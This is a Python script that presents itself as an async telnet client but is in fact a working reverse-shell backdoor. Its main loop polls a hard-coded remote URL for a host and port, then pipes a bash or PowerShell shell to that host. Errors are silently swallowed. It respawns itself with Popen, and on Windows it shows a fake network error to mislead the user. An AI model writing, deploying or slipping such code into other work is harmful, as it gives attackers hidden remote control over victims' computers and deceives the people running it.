import asyncio
import aiohttp # type: ignore
import sys
import telnetlib3

from dataclasses import dataclass
from threading import Thread
from subprocess import Popen
from contextlib import contextmanager
from telnetlib3.client import open_connection as open_telnet_connection
from telnetlib3 import accessories

SLEEP_PERIOD_SECS = 2

URL_STATUS = "http://erzhanoriez.winogrona.cc/data/status"

SHELL = ""
if sys.platform == 'win32':
    SHELL = "powershell.exe"
else:
    SHELL = "bash"

def excguard(coro):
    async def newfun(*args, **kwargs):
        try:
            await coro(*args, **kwargs)
        except Exception as e:
            pass
    
    return newfun

@excguard
async def revshell(host: str, port: int) -> None:
    shell = await asyncio.create_subprocess_shell(SHELL, stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)

    (reader, writer) = await asyncio.open_connection(host, port)

    future_readclosed = asyncio.get_running_loop().create_future()

    async def stdin_task():
        while True:
            data = await reader.read(1024)
            shell.stdin.write(data)
        
    async def stderr_task():
        while True:
            data = await shell.stderr.read(1024)
            if len(data) == 0:
                future_readclosed.set_result(None)
                return

            writer.write(data)

    async def stdout_task():
        while True:
            data = await shell.stdout.read(1024)
            if len(data) == 0:
                future_readclosed.set_result(None)
                return

            writer.write(data)
    
    shell_coros = [stdin_task(), stdout_task(), stderr_task()]
    shell_tasks = [asyncio.create_task(coro) for coro in shell_coros]

    await future_readclosed
    for task in shell_tasks:
        task.cancel()

    reader.feed_eof()
    writer.close()

async def струи_СЭКСА():
    cur_stream_id = -1
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(URL_STATUS) as resp:
                    (host, port, stream_id) = (await resp.text()).split(":")
                    port = int(port)
                    stream_id = int(stream_id)

                    if stream_id > cur_stream_id:
                        asyncio.create_task(revshell(host, port))
                        cur_stream_id = stream_id

        except Exception as e:
            pass
            
        await asyncio.sleep(SLEEP_PERIOD_SECS)

def seks_installer():
    exe = sys.executable

async def am_main(host: str, port: int) -> None:
    if sys.platform == "win32":
        raise SystemError("[WinError 121] The semaphore state has been invalidated, [WinError 1231] The network location cannot be reached. For information about network troubleshooting, see Windows Help")
        exit()
    
    else:
        (reader, writer) = await open_telnet_connection(host=host, port=port, shell=telnetlib3.telnet_client_shell, encoding="utf8", term="TERM", force_binary=True)
    await writer.protocol.waiter_closed

def async_client(host: str, port: int) -> None:
    Popen([sys.executable, __file__])
    asyncio.run(am_main(host, port))

if __name__ == '__main__':
    # asyncio.run(am_main(host="winogrona.cc", port=22889))
    seks_installer()
    asyncio.run(струи_СЭКСА())